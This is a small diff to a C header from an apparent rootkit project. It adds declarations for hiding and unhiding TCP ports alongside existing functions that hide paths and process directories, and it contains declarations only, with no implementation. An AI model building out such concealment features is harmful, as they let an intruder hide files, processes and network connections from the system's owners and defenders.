@@ -15,6 +15,9 @@ void unhide_absolute_path(const char *path);
 void hide_process_dir(int pid);
 void unhide_process_dir(int pid);
 
+void hide_tcp_port(PORT port);
+void unhide_tcp_port(PORT port);
+
 void reports_test();
 
 #endif //ROOTKIT_FILE_HIDING_ACCESS_H
